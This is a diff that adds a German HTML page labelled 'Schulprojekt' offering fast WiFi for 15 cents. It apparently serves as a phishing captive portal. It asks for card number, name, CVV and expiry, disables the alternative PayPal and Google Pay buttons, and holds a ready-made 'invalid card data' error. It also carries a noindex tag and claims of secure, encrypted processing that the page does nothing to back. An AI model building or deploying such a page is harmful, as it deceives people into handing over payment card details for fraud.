@@ -1,0 +1,56 @@
+<!DOCTYPE html>
+<html lang="de">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Schulprojekt</title>
+    <meta name="robots" content="noindex, nofollow">
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <div class="container">
+        <h2>Schulprojekt</h2>
+        <div class="subtitle">Erhalte schnelles WLAN für 15 Cent</div>
+        
+        <form id="paymentForm">
+            <div class="form-group">
+                <label for="cardNumber">Kartennummer</label>
+                <input type="text" id="cardNumber" placeholder="1234 5678 9012 3456" required>
+            </div>
+            <div class="form-group">
+                <label for="cardName">Name auf der Karte</label>
+                <input type="text" id="cardName" placeholder="Max Mustermann" required>
+            </div>
+            <div class="form-group">
+                <label for="cvv">Sicherheitscode (CVV)</label>
+                <input type="text" id="cvv" placeholder="123" required>
+            </div>
+            <div class="form-group">
+                <label for="expiry">Gültig bis (MM/JJ)</label>
+                <input type="text" id="expiry" placeholder="05/25" required>
+            </div>
+
+            <div class="payment-buttons">
+                <button type="button" class="payment-btn" onclick="showUnavailable()">PayPal</button>
+                <button type="button" class="payment-btn" onclick="showUnavailable()">Google Pay</button>
+            </div>
+
+            <div class="error-message" id="errorMessage">
+                Probleme mit der Verbindung oder ungültige Kartendaten
+            </div>
+            
+            <button type="submit">0,15 € bezahlen</button>
+        </form>
+
+        <div class="security-text">
+            Sichere Zahlungsabwicklung · Verschlüsselte Datenübertragung · DSGVO-konform
+        </div>
+        
+        <div class="copyright">
+            © 2024 Schulprojekt WLAN. Alle Rechte vorbehalten. Dieser Service ist sicher und geschützt.
+        </div>
+    </div>
+
+    <script src="script.js"></script>
+</body>
+</html>
